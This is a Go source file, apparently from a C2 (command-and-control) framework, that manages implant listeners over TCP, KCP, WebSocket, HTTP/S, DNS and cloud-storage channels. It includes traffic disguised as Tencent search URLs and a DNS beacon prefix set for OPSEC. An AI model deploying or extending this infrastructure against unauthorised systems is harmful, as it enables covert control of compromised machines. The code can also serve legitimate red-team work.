package api

import (
	"BackendTemplate/pkg/audit"
	"BackendTemplate/pkg/api/communication"
	"BackendTemplate/pkg/c2profile"
	"BackendTemplate/pkg/certutil"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/connection"

	k "BackendTemplate/pkg/connection/kcp"
	"BackendTemplate/pkg/connection/oss"
	dns_listener "BackendTemplate/pkg/connection/dns"
	"BackendTemplate/pkg/connection/tcp"
	"BackendTemplate/pkg/connection/websocket"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	gorillaws "github.com/gorilla/websocket"
	"github.com/xtaci/kcp-go/v5"
	"BackendTemplate/pkg/utils/logx"
)

func AddListener(c *gin.Context) {
	var listener struct {
		Type           string `json:"type"`
		ListenAddress  string `json:"listenAddress"`
		ConnectAddress string `json:"connectAddress"`
		Retries        string `json:"retries"`        // 心跳超时次数
		Interval       string `json:"interval"`       // 心跳检测间隔
		Note           string `json:"note"`           // 监听器备注
		VKey           string `json:"vkey"`           // VKey
		EncryptionSalt string `json:"encryptionSalt"` // 流量加密盐
	}
	if err := c.BindJSON(&listener); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	// 脱敏预览不是真实值：从列表里复制粘贴过来的地址/密钥会把占位符存成真实配置
	for _, v := range []string{listener.ListenAddress, listener.ConnectAddress, listener.VKey, listener.EncryptionSalt} {
		if isMaskedValue(v) {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "检测到脱敏预览值（含 " + maskedMarker + "），请填写真实值"})
			return
		}
	}
	if exists, _ := database.Engine.Where("listen_address LIKE ?", "%"+listener.ListenAddress).Exist(&database.Listener{}); exists {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener already exists"})
		return
	}

	// 设置默认值（如果前端没有传值）
	heartbeatTimeout := listener.Retries
	if heartbeatTimeout == "" {
		heartbeatTimeout = "30"
	}
	heartbeatInterval := listener.Interval
	if heartbeatInterval == "" {
		heartbeatInterval = "10"
	}

	// 若未指定密钥/盐，随机生成并持久化，避免使用公开默认常量（见 encrypt.GetListenerKeyConfig 回退值）
	if listener.VKey == "" || listener.EncryptionSalt == "" {
		vk, salt := encrypt.GenerateListenerKeyConfig()
		if listener.VKey == "" {
			listener.VKey = vk
		}
		if listener.EncryptionSalt == "" {
			listener.EncryptionSalt = salt
		}
	}

	// J4 前置 + 长度：默认/空密钥的监听器 handleOpenPort 必然拒绝启动，过短的密钥则会让派生
	// 密钥尾部零填充。原实现先 Insert(Status:1) 再 go handleOpenPort，被拒绝后库里会留下
	// Status=1 却没有句柄的记录（前端显示"监听中"）。留空会走到上面的随机生成，故此处校验
	// 的是最终要落库的值。
	if err := encrypt.ValidateListenerKeyConfig(listener.VKey, listener.EncryptionSalt); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}

	database.Engine.Insert(&database.Listener{
		Type:              listener.Type,
		ListenAddress:     listener.ListenAddress,
		ConnectAddress:    listener.ConnectAddress,
		Status:            1,
		HeartbeatTimeout:  heartbeatTimeout,
		HeartbeatInterval: heartbeatInterval,
		Note:              listener.Note,
		VKey:              listener.VKey,
		EncryptionSalt:    listener.EncryptionSalt,
	})
	encrypt.InvalidateListenerKeyCache()
	// D18: 业务审计
	auditLogEvent("LISTENER_ADD", "SUCCESS", "新增监听器 "+listener.Type+"://"+listener.ListenAddress, map[string]interface{}{"type": listener.Type, "address": listener.ListenAddress})
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener added"})
	go handleOpenPort(listener.Type, listener.ListenAddress, listener.VKey, listener.EncryptionSalt)
}

// maskedMarker 脱敏预览的占位符。凡含此标记的值都视为"不是真实值，而是对库中现有值的引用"：
// 更新时保留原值、按地址查找时先还原、新建时拒绝（见 resolveListenerAddress / isMaskedValue）。
const maskedMarker = "****"

// isMaskedValue 判断值是否为脱敏预览
func isMaskedValue(v string) bool { return strings.Contains(v, maskedMarker) }

// maskSecretPreview 密钥类字段的脱敏预览：保留首 4 与末 2 字符。
// 与前端 maskSecret 规则一致，且对其幂等（再掩码一次结果不变），故现有前端无需同步改动。
// 空值仍返回空串，前端会显示"默认"（与改动前一致）。
func maskSecretPreview(secret string) string {
	if secret == "" {
		return ""
	}
	if len(secret) <= 4 {
		return maskedMarker
	}
	return secret[:4] + maskedMarker + secret[len(secret)-2:]
}

// maskListenerAddress 脱敏监听地址。仅 oss 类型把凭证放在地址里
// （endpoint:accessKeyID:accessKeySecret:bucket，见 handleOpenPort 的 oss 分支），
// 把 AK/SK 两段替换为占位符；其余类型（含 dns 的 addr:port:domain）不含凭证，原样返回。
func maskListenerAddress(listenerType, addr string) string {
	if !strings.EqualFold(listenerType, "oss") || addr == "" {
		return addr
	}
	parts := strings.Split(addr, ":")
	if len(parts) < 4 {
		return addr
	}
	parts[1], parts[2] = maskedMarker, maskedMarker
	return strings.Join(parts, ":")
}

// listenerResponse 监听器列表响应。字段名与 database.Listener 保持一致（前端按 row.VKey /
// row.ListenAddress 读取），但密钥类字段只回脱敏预览，凭证不进浏览器。
type listenerResponse struct {
	Id                int64  `json:"Id"`
	Type              string `json:"Type"`
	ListenAddress     string `json:"ListenAddress"`
	ConnectAddress    string `json:"ConnectAddress"`
	Status            int    `json:"Status"`
	HeartbeatTimeout  string `json:"HeartbeatTimeout"`
	HeartbeatInterval string `json:"HeartbeatInterval"`
	Note              string `json:"Note"`
	VKey              string `json:"VKey"`
	EncryptionSalt    string `json:"EncryptionSalt"`
}

func maskListenerForResponse(l database.Listener) listenerResponse {
	return listenerResponse{
		Id:                l.Id,
		Type:              l.Type,
		ListenAddress:     maskListenerAddress(l.Type, l.ListenAddress),
		ConnectAddress:    maskListenerAddress(l.Type, l.ConnectAddress),
		Status:            l.Status,
		HeartbeatTimeout:  l.HeartbeatTimeout,
		HeartbeatInterval: l.HeartbeatInterval,
		Note:              l.Note,
		VKey:              maskSecretPreview(l.VKey),
		EncryptionSalt:    maskSecretPreview(l.EncryptionSalt),
	}
}

// resolveListenerAddress 把可能带脱敏标记的地址还原为库中真实地址。
// 前端从列表/详情接口拿到的是脱敏值，原样回传给开关、删除、重启、更新、生成等按地址
// 查找的接口时必须先还原，否则查不到记录（动作全部失效）；生成接口更是会把脱敏串
// patch 进客户端。非脱敏值走快路径原样返回，故对不含凭证的类型（绝大多数）完全无影响。
// wantField 指明比对哪个字段："listen" 或 "connect"。还原不到时原样返回，由调用方按
// 原逻辑报"监听器不存在"。
func resolveListenerAddress(submitted, wantField string) string {
	if !isMaskedValue(submitted) || database.Engine == nil {
		return submitted
	}
	var all []database.Listener
	if err := database.Engine.Find(&all); err != nil {
		return submitted
	}
	for _, l := range all {
		if wantField == "connect" {
			if maskListenerAddress(l.Type, l.ConnectAddress) == submitted {
				return l.ConnectAddress
			}
		} else if maskListenerAddress(l.Type, l.ListenAddress) == submitted {
			return l.ListenAddress
		}
	}
	return submitted
}

func ListListener(c *gin.Context) {
	var listeners []database.Listener
	database.Engine.Find(&listeners)
	// 只回脱敏预览：VKey/加密盐是会话密钥派生的根，oss 的 AK/SK 更是可直接复用的云凭证
	result := make([]listenerResponse, 0, len(listeners))
	for _, l := range listeners {
		result = append(result, maskListenerForResponse(l))
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": result})
}
func OpenListener(c *gin.Context) {
	var listener struct {
		ListenAddress string `json:"listenAddress"`
	}
	if err := c.BindJSON(&listener); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	// 前端从列表接口拿到的是脱敏地址，原样回传时先还原为库中真实地址
	listener.ListenAddress = resolveListenerAddress(listener.ListenAddress, "listen")
	var lis database.Listener
	database.Engine.Where("listen_address = ?", listener.ListenAddress).Get(&lis)
	if lis.Status == 2 {
		database.Engine.Where("listen_address = ?", listener.ListenAddress).Update(&database.Listener{Status: 1})

		encrypt.InvalidateListenerKeyCache()
		go handleOpenPort(lis.Type, listener.ListenAddress, lis.VKey, lis.EncryptionSalt)
		auditLogEvent("LISTENER_OPEN", "SUCCESS", "启动监听器 "+lis.Type+"://"+listener.ListenAddress, nil)
		c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener opened"})
	} else {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener already opened"})
	}

}
func CloseListener(c *gin.Context) {
	var listener struct {
		ListenAddress string `json:"listenAddress"`
	}
	if err := c.BindJSON(&listener); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	listener.ListenAddress = resolveListenerAddress(listener.ListenAddress, "listen")
	var lis database.Listener
	database.Engine.Where("listen_address = ?", listener.ListenAddress).Get(&lis)
	if lis.Status == 1 {
		database.Engine.Where("listen_address = ?", listener.ListenAddress).Update(&database.Listener{Status: 2})
		encrypt.InvalidateListenerKeyCache()
		handleClosePort(lis.Type, lis.ListenAddress, c)
		auditLogEvent("LISTENER_CLOSE", "SUCCESS", "关闭监听器 "+lis.Type+"://"+listener.ListenAddress, nil)
		c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener closed"})
	} else {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener already closed"})
	}

}
func DeleteListener(c *gin.Context) {
	var listener struct {
		ListenAddress string `json:"listenAddress"`
	}
	if err := c.BindJSON(&listener); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	listener.ListenAddress = resolveListenerAddress(listener.ListenAddress, "listen")
	var lis database.Listener
	database.Engine.Where("listen_address = ?", listener.ListenAddress).Get(&lis)
	if lis.Status == 1 {
		handleClosePort(lis.Type, lis.ListenAddress, c)
	}
	database.Engine.Where("listen_address = ?", listener.ListenAddress).Delete(&database.Listener{})
	encrypt.InvalidateListenerKeyCache()
	auditLogEvent("LISTENER_DELETE", "SUCCESS", "删除监听器 "+lis.Type+"://"+listener.ListenAddress, nil)
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener deleted"})
}

// UpdateListener 更新监听器配置
func UpdateListener(c *gin.Context) {
	var listener struct {
		Id                int64  `json:"id"`             // 监听器ID，用于唯一标识
		ListenAddress     string `json:"listenAddress"`
		Type              string `json:"type"`
		ConnectAddress    string `json:"connectAddress"`
		HeartbeatTimeout  string `json:"retries"`        // 心跳超时次数
		HeartbeatInterval string `json:"interval"`       // 心跳检测间隔
		Note              string `json:"note"`           // 监听器备注
		VKey              string `json:"vkey"`           // VKey
		EncryptionSalt    string `json:"encryptionSalt"` // 流量加密盐
	}

	// 检查请求上下文
	if c == nil {
		log.Printf("❌ [监听器更新] 请求上下文为空")
		return
	}

	if err := c.BindJSON(&listener); err != nil {
		log.Printf("❌ [监听器更新] 参数绑定失败: %v", err)
		c.JSON(http.StatusBadRequest, gin.H{"error": "参数绑定失败: " + err.Error()})
		return
	}

	// 带脱敏标记的值是列表接口回给前端的预览，前端编辑框预填后原样回传，
	// 在此归一为"未提供"——后续合并（留空即保留原值）与长度校验都按此处理。
	if isMaskedValue(listener.VKey) {
		listener.VKey = ""
	}
	if isMaskedValue(listener.EncryptionSalt) {
		listener.EncryptionSalt = ""
	}

	// 检查必要参数
	if listener.Id <= 0 {
		log.Printf("❌ [监听器更新] 监听器ID不能为空或无效")
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "监听器ID不能为空或无效"})
		return
	}
	if listener.ListenAddress == "" {
		log.Printf("❌ [监听器更新] 监听地址不能为空")
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "监听地址不能为空"})
		return
	}

	// 设置默认值（如果前端没有传值）
	heartbeatTimeout := listener.HeartbeatTimeout
	if heartbeatTimeout == "" {
		heartbeatTimeout = "30"
	}
	heartbeatInterval := listener.HeartbeatInterval
	if heartbeatInterval == "" {
		heartbeatInterval = "10"
	}

	// 检查数据库引擎是否初始化
	if database.Engine == nil {
		log.Printf("❌ [监听器更新] 数据库引擎未初始化")
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "data": "数据库引擎未初始化"})
		return
	}

	// 首先获取当前监听器的状态，确保更新时不改变状态
	var currentListener database.Listener
	// 使用ID查询当前监听器信息
	has, err := database.Engine.ID(listener.Id).Get(&currentListener)
	if err != nil {
		log.Printf("❌ [监听器更新] 查询当前监听器信息失败: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "data": "查询当前监听器信息失败: " + err.Error()})
		return
	}
	if !has {
		log.Printf("❌ [监听器更新] 监听器不存在: ID=%d", listener.Id)
		c.JSON(http.StatusNotFound, gin.H{"status": 404, "data": fmt.Sprintf("监听器不存在: ID=%d", listener.Id)})
		return
	}

	// 记录更新前的状态
	log.Printf("🔍 [监听器更新] 更新前状态 - ID: %d, 地址: %s -> %s, 状态: %d", listener.Id, currentListener.ListenAddress, listener.ListenAddress, currentListener.Status)

	// 更新数据库中的监听器记录，保持原有状态
	// 地址同样先还原脱敏值：否则 oss 监听器一编辑就会把 AK/SK 写成占位符
	updateData := &database.Listener{
		Type:              listener.Type,
		ListenAddress:     resolveListenerAddress(listener.ListenAddress, "listen"), // 允许更新监听地址
		ConnectAddress:    resolveListenerAddress(listener.ConnectAddress, "connect"),
		HeartbeatTimeout:  heartbeatTimeout,
		HeartbeatInterval: heartbeatInterval,
		Note:              listener.Note,
		Status:            currentListener.Status, // 保持原有状态
	}
	// 密钥字段仅在显式提供时更新：编辑保存时留空视为不修改，
	// 避免前端表单未填写密钥就把监听器密钥清空（清空后监听器无法启动）
	if listener.VKey != "" {
		updateData.VKey = listener.VKey
	} else {
		updateData.VKey = currentListener.VKey
	}
	if listener.EncryptionSalt != "" {
		updateData.EncryptionSalt = listener.EncryptionSalt
	} else {
		updateData.EncryptionSalt = currentListener.EncryptionSalt
	}

	// 校验合并后的密钥：必须非空且非公开默认值。长度档只施加于本次显式提交的字段
	// （ValidateListenerKeyLength 对空串跳过）——否则编辑既有短密钥监听器的备注
	// 都会因旧密钥不合规而被拒。
	if err := encrypt.ValidateListenerKeyConfigForStart(updateData.VKey, updateData.EncryptionSalt); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	if err := encrypt.ValidateListenerKeyLength(listener.VKey, listener.EncryptionSalt); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}

	// 使用ID更新记录，而不是listenAddress
	// 【零值修复】AllCols 显式写入全部字段：请求即完整配置，空字符串也须落库
	// （默认零值跳过会导致清空 Note/密钥等字段静默失效）
	affected, err := database.Engine.ID(listener.Id).AllCols().Update(updateData)
	if err != nil {
		log.Printf("❌ [监听器更新] 更新监听器失败: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "data": "更新监听器失败: " + err.Error()})
		return
	}
	encrypt.InvalidateListenerKeyCache()

	// 记录更新后的状态
	log.Printf("✅ [监听器更新] 更新成功 - ID: %d, 新地址: %s, 影响行数: %d, 状态: %d", listener.Id, listener.ListenAddress, affected, currentListener.Status)

	c.JSON(http.StatusOK, gin.H{"status": 200, "data": "监听器更新成功"})
}

// BatchDeleteListeners 批量删除监听器
func BatchDeleteListeners(c *gin.Context) {
	log.Printf("[LISTENER-API] 🗑️ 收到批量删除监听器请求")

	var requestBody struct {
		ListenAddresses []string `json:"listen_addresses"`
	}
	if err := c.ShouldBindJSON(&requestBody); err != nil {
		log.Printf("[LISTENER-API] ❌ 参数绑定失败: %v", err)
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if len(requestBody.ListenAddresses) == 0 {
		log.Printf("[LISTENER-API] ❌ 没有提供要删除的监听地址")
		c.JSON(http.StatusBadRequest, gin.H{"error": "没有提供要删除的监听地址"})
		return
	}

	log.Printf("[LISTENER-API] 🔍 批量删除监听器，地址: %v", requestBody.ListenAddresses)

	successCount := 0
	failedCount := 0
	var failedAddresses []string

	for _, address := range requestBody.ListenAddresses {
		address = resolveListenerAddress(address, "listen")
		log.Printf("[LISTENER-API] 🔍 处理删除监听器 地址: %s", address)

		// 查找监听器记录
		var listener database.Listener
		has, err := database.Engine.Where("listen_address = ?", address).Get(&listener)
		if err != nil {
			log.Printf("[LISTENER-API] ❌ 数据库查询失败 地址: %s, 错误: %v", address, err)
			failedCount++
			failedAddresses = append(failedAddresses, address)
			continue
		}
		if !has {
			log.Printf("[LISTENER-API] ❌ 监听器记录不存在 地址: %s", address)
			failedCount++
			failedAddresses = append(failedAddresses, address)
			continue
		}

		log.Printf("[LISTENER-API] 📋 删除监听器配置 地址: %s", address)

		// 如果监听器在线，先关闭它
		if listener.Status == 1 {
			log.Printf("[LISTENER-API] 🔄 关闭活跃监听器 地址: %s", address)
			handleClosePort(listener.Type, listener.ListenAddress, c)
		}

		// 从数据库删除监听器记录
		log.Printf("[LISTENER-API] 🗑️ 从数据库删除监听器记录 地址: %s", address)
		affected, err := database.Engine.Where("listen_address = ?", address).Delete(&database.Listener{})
		if err != nil {
			log.Printf("[LISTENER-API] ❌ 删除数据库记录失败 地址: %s, 错误: %v", address, err)
			failedCount++
			failedAddresses = append(failedAddresses, address)
			continue
		}
		log.Printf("[LISTENER-API] 📊 数据库删除影响行数: %d, 地址: %s", affected, address)
		if affected > 0 {
			successCount++
			log.Printf("[LISTENER-API] ✅ 监听器删除成功 地址: %s", address)
		} else {
			failedCount++
			failedAddresses = append(failedAddresses, address)
			log.Printf("[LISTENER-API] ❌ 删除失败，可能记录不存在 地址: %s", address)
		}
	}
	encrypt.InvalidateListenerKeyCache()

	log.Printf("[LISTENER-API] ✅ 批量删除完成: 成功 %d 个，失败 %d 个", successCount, failedCount)

	response := gin.H{
		"status":        200,
		"message":       fmt.Sprintf("批量删除完成: 成功 %d 个，失败 %d 个", successCount, failedCount),
		"success_count": successCount,
		"failed_count":  failedCount,
		"total_count":   len(requestBody.ListenAddresses),
	}

	if len(failedAddresses) > 0 {
		response["failed_addresses"] = failedAddresses
	}

	c.JSON(http.StatusOK, response)
}
// handleOpenPort 启动监听器。vkey/salt 为该监听器自身的密钥配置，
// 传递给连接处理器用于会话密钥派生，避免同类型多监听器时按 type 查库取错密钥。

// registerHTTPRoutes 按 C2 Profile 注册 http/https 监听器路由（默认 profile 路径兼容）。
// vkey/salt 为该监听器自身的密钥配置，经闭包透传给轮询处理器：http/https 可多实例且
// 各持独立密钥，处理器内按类型查库在同类型多监听器时只能取到任意一行（与 websocket
// 分支同一处理方式）。
func registerHTTPRoutes(mux *http.ServeMux, vkey, salt string) {
	p := c2profile.GetDefault()
	getURI, postURI := "/tencent/mcp/pc/pcsearch", "/tencent/sensearch/collection/item/check"
	if p != nil {
		if p.HTTP.Get.URI != "" {
			getURI = p.HTTP.Get.URI
		}
		if p.HTTP.Post.URI != "" {
			postURI = p.HTTP.Post.URI
		}
	}
	mux.HandleFunc(getURI, func(w http.ResponseWriter, r *http.Request) {
		communication.GetHttpWithKeys(w, r, []byte(vkey), []byte(salt))
	})
	mux.HandleFunc(postURI, func(w http.ResponseWriter, r *http.Request) {
		communication.PostHttpWithKeys(w, r, []byte(vkey), []byte(salt))
	})
}

// isForwardListenerType 正向监听类型：服务端主动拨出，不 bind 本机端口
func isForwardListenerType(listenerType string) bool {
	switch listenerType {
	case "tcp_forward", "kcp_forward", "ws_forward", "http_forward", "https_forward":
		return true
	}
	return false
}

// markListenerStartFailed 启动失败时把监听器状态回置为"已停止"。
// 否则库里会留下 Status=1 却没有句柄的记录：前端显示"监听中"、dashboard 的监听器
// 计数虚高，而 listenerHandleAlive 探活为 false（只有 RestartListener 会用到探活）。
// 各启动失败分支（J4 拒绝、端口绑定失败、证书生成失败、HTTP(S) 服务起不来）统一走这里。
func markListenerStartFailed(listenerType, listenerAddress, reason string) {
	if database.Engine != nil {
		database.Engine.Where("listen_address = ?", listenerAddress).Update(&database.Listener{Status: 2})
		encrypt.InvalidateListenerKeyCache()
	}
	logx.Errorf("❌ [监听器] %s://%s 启动失败，状态已回置为已停止：%s\n", listenerType, listenerAddress, reason)
}

func handleOpenPort(listenerType string, listenerAddress string, vkey string, salt string) {
	// 崩溃防护：任何监听器 panic 都不能杀死整个 C2 进程
	defer func() {
		if r := recover(); r != nil {
			logx.Errorf("❌ [监听器-RECOVER] 监听器 %s (%s) panic已捕获: %v\n", listenerType, listenerAddress, r)
		}
	}()

	// J4: 启动强制——监听器无自定义密钥（默认/空）时拒绝启动
	// （默认密钥为公开常量：流量可解密、可伪造客户端劫持会话）
	// 与 AddListener 入库前共用 encrypt.ValidateListenerKeyConfigForStart，避免两处判定漂移。
	// 正向监听豁免：其密钥随客户端生成时的 patch 走，记录未配密钥时两端一致地使用正向
	// 占位符默认值（encrypt.GetListenerKeyConfigForForward），这是既有设计；且正向不 bind
	// 端口，J4 要防的"公开端口 + 可预测密钥"不成立。自动拨号处会对占位符密钥告警。
	if !isForwardListenerType(listenerType) {
		if err := encrypt.ValidateListenerKeyConfigForStart(vkey, salt); err != nil {
			markListenerStartFailed(listenerType, listenerAddress, err.Error())
			return
		}
		// 长度档只告警不阻断：短密钥的监听器此前一直能跑，升级后不应直接起不来
		if err := encrypt.ValidateListenerKeyLength(vkey, salt); err != nil {
			logx.Warnf("⚠️ [监听器] %s://%s 密钥强度不足（仍将启动）：%v\n", listenerType, listenerAddress, err)
		}
	}

	switch listenerType {
	case "websocket":
		mux := http.NewServeMux()
		mux.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
			if vkey != "" && salt != "" {
				websocket.HandleWebSocketWithKeys(w, r, []byte(vkey), []byte(salt))
			} else {
				websocket.HandleWebSocket(w, r)
			}
		})

		server := &http.Server{
			Addr:           listenerAddress, // 确保listener.ListenAddress包含了端口号，如":8080"
			Handler:        mux,
			ReadTimeout:    15 * time.Second,
			WriteTimeout:   15 * time.Second,
			MaxHeaderBytes: 1 << 20,
		}
		connection.MuClientListenerType.Lock()
		connection.HttpServer[listenerAddress] = server
		connection.MuClientListenerType.Unlock()
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			// 不用 log.Fatal：单端口 bind 失败不应拖垮整个 C2（其他监听器与已上线客户端）
			connection.MuClientListenerType.Lock()
			delete(connection.HttpServer, listenerAddress)
			connection.MuClientListenerType.Unlock()
			markListenerStartFailed(listenerType, listenerAddress, "WebSocket 监听失败: "+err.Error())
		}

	case "tcp":
		tcpListener, err := net.Listen("tcp", listenerAddress)
		if err != nil {
			markListenerStartFailed(listenerType, listenerAddress, "TCP 端口绑定失败: "+err.Error())
			return
		}
		connection.MuClientListenerType.Lock()
		connection.TCPServer[listenerAddress] = tcpListener
		connection.MuClientListenerType.Unlock()
		logx.Println("Listening on:", listenerAddress)

		for {
			conn, err := tcpListener.Accept()
			if err != nil {
				logx.Println("Error accepting connection:", err)
				break
			}

			go tcp.HandleTcpConnectionForWithKeys(conn, "tcp", []byte(vkey), []byte(salt))
		}
	case "kcp":
		lis, err := kcp.ListenWithOptions(listenerAddress, nil, 10, 3)
		if err != nil {
			// 不用 log.Fatal：单端口失败不拖垮整个 C2
			markListenerStartFailed(listenerType, listenerAddress, "KCP 端口绑定失败: "+err.Error())
			return
		}
		logx.Println("Server listening on", listenerAddress)
		connection.MuClientListenerType.Lock()
		connection.KCPServer[listenerAddress] = lis
		connection.MuClientListenerType.Unlock()
		// 循环等待客户端连接
		for {
			conn, err := lis.AcceptKCP()
			if err != nil {
				log.Println("Accept error:", err)
				break
			}
			logx.Println("Client connected:", conn.RemoteAddr())

			// 处理客户端连接
			go k.HandleKCPConnectionForWithKeys(conn, "kcp", []byte(vkey), []byte(salt))
		}
	case "http":
		mux := http.NewServeMux()
		registerHTTPRoutes(mux, vkey, salt)

		server := &http.Server{
			Addr:              listenerAddress,
			Handler:           mux,
			ReadHeaderTimeout: 30 * time.Second, // 防 Slowloris：慢速请求头占满连接
			ReadTimeout:       30 * time.Second,
			WriteTimeout:      60 * time.Second,
			IdleTimeout:       120 * time.Second,
		}

		// 存储服务器实例
		connection.MuClientListenerType.Lock()
		connection.HttpServer[listenerAddress] = server
		connection.MuClientListenerType.Unlock()

		// 启动服务器（非阻塞）
		go func() {
			if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				// 端口被占用等启动失败：句柄已在 map 中，必须摘掉，否则 listenerHandleAlive
				// 会因句柄存在而误判为运行中（websocket 分支原有此清理，http/https 漏了）
				connection.MuClientListenerType.Lock()
				delete(connection.HttpServer, listenerAddress)
				connection.MuClientListenerType.Unlock()
				markListenerStartFailed(listenerType, listenerAddress, "HTTP 监听失败: "+err.Error())
			}
		}()
	case "https":
		// HTTPS C2 监听器：与 http 相同的轮询路由，但走 TLS。
		// 证书优先取 config.yaml https.cert_file/key_file；为空则自动生成自签名证书兜底
		//（SAN 含 connect_address 主机名与回环）。客户端严格校验证书——生产请配置真实证书。
		certFile, keyFile := "", ""
		if g := config.GetGlobalConfig(); g != nil {
			certFile, keyFile = g.HTTPS.CertFile, g.HTTPS.KeyFile
		}
		if certFile == "" || keyFile == "" {
			var sanHosts []string
			var lis database.Listener
			if has, _ := database.Engine.Where("listen_address = ?", listenerAddress).Get(&lis); has && lis.ConnectAddress != "" {
				// connect_address 形如 host:port 或 host（取 host 部分作 SAN）
				ca := strings.Split(lis.ConnectAddress, ":")
				sanHosts = append(sanHosts, ca[0])
			}
			var err error
			certFile, keyFile, err = certutil.GenerateSelfSigned(sanHosts, "certs")
			if err != nil {
				markListenerStartFailed(listenerType, listenerAddress, "生成自签名证书失败: "+err.Error())
				return
			}
			logx.Infof("🔐 [HTTPS] 未配置证书，已生成自签名证书: %s（生产请配置真实证书）\n", certFile)
		}

		mux := http.NewServeMux()
		registerHTTPRoutes(mux, vkey, salt)

		server := &http.Server{
			Addr:              listenerAddress,
			Handler:           mux,
			ReadHeaderTimeout: 30 * time.Second,
			ReadTimeout:       30 * time.Second,
			WriteTimeout:      60 * time.Second,
			IdleTimeout:       120 * time.Second,
		}

		// 存储服务器实例（与 http 共用 HttpServer map，close 时统一处理）
		connection.MuClientListenerType.Lock()
		connection.HttpServer[listenerAddress] = server
		connection.MuClientListenerType.Unlock()

		// 启动 TLS 服务器（非阻塞）
		go func() {
			if err := server.ListenAndServeTLS(certFile, keyFile); err != nil && err != http.ErrServerClosed {
				connection.MuClientListenerType.Lock()
				delete(connection.HttpServer, listenerAddress)
				connection.MuClientListenerType.Unlock()
				markListenerStartFailed(listenerType, listenerAddress, "HTTPS 监听失败: "+err.Error())
			}
		}()
	case "oss":
		tmp := strings.Split(listenerAddress, ":")
		connection.MuClientListenerType.Lock()
		// I6: 有缓冲(1)停止通道——OSS 循环可能在 List/process_server 中（无 select），
		// 无缓冲 + 非阻塞发送会丢信号导致 OSS 轮询 goroutine 永久泄漏
		connection.StopChan[listenerAddress] = make(chan bool, 1)
		connection.MuClientListenerType.Unlock()
		go oss.HandleOSSConnection(tmp[0], tmp[1], tmp[2], tmp[3])
	case "dns":
		tmp := strings.Split(listenerAddress, ":")
		dnsAddr := tmp[0] + ":" + tmp[1]
		domain := "dns.tshell."
		if len(tmp) > 2 {
			domain = tmp[2] + "."
		}
		// OPSEC: DNS 标签前缀随 Profile（客户端生成时同步 patch 同一值）
		if p := c2profile.GetDefault(); p != nil {
			dns_listener.SetDNSLabelPrefix(sanitizeMasquerade(p.DNS.BeaconPrefix))
		}
		go dns_listener.HandleDNSConnection(dnsAddr, domain)
	case "tcp_forward", "kcp_forward", "ws_forward", "http_forward", "https_forward":
		// 正向监听不 bind 本机端口：启用后主动拨 connect_address 上的正向客户端，
		// 掉线按退避重连（server.go 自动创建记录处注释所称"启用后由 handleOpenPort 自动拨号"）。
		// 密钥与手动连接、客户端生成同源：记录配了自定义密钥就用它，否则两端一致地使用正向
		// 占位符默认值（见 encrypt.GetListenerKeyConfigForForward）。
		target := listenerAddress
		var flis database.Listener
		if has, _ := database.Engine.Where("listen_address = ?", listenerAddress).Get(&flis); has && flis.ConnectAddress != "" {
			target = flis.ConnectAddress
		}
		fmk, fsl := encrypt.GetListenerKeyConfigForForward(listenerType)
		if encrypt.IsDefaultListenerKey(fmk, fsl) {
			logx.Warnf("⚠️ [正向拨号] %s://%s 使用正向默认（占位符）密钥，流量可被解密；建议为该监听器配置自定义 VKey/加密盐并重新生成客户端\n", listenerType, listenerAddress)
		}
		connection.MuClientListenerType.Lock()
		stopCh := make(chan bool, 1)
		connection.StopChan[listenerAddress] = stopCh
		connection.MuClientListenerType.Unlock()
		go runForwardDialer(listenerType, target, fmk, fsl, stopCh)

	default:
		// 未知类型无法启动：显式失败而不是静默返回（原实现静默 return，库里留下 Status=1）
		markListenerStartFailed(listenerType, listenerAddress, "未知的监听器类型")
	}
}
func handleClosePort(listenerType string, listenerAddress string, c *gin.Context) {
	logx.Infof("🔄 [监听器管理] 开始关闭 %s 监听器: %s\n", listenerType, listenerAddress)

	// 首先清理该监听器下的所有客户端连接
	cleanupClientsForListener(listenerType, listenerAddress)

	switch listenerType {
	case "websocket":
		// 锁内取句柄并 delete，解锁后再 Close，避免与 handleOpenPort 写 map 竞态
		connection.MuClientListenerType.Lock()
		srv := connection.HttpServer[listenerAddress]
		delete(connection.HttpServer, listenerAddress)
		connection.MuClientListenerType.Unlock()
		if srv == nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener not found"})
			return
		}
		err := srv.Close()
		logx.Infof("✅ [监听器管理] WebSocket监听器已关闭: %s\n", listenerAddress)
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener closed failed"})
			return
		}
	case "tcp":
		connection.MuClientListenerType.Lock()
		lis := connection.TCPServer[listenerAddress]
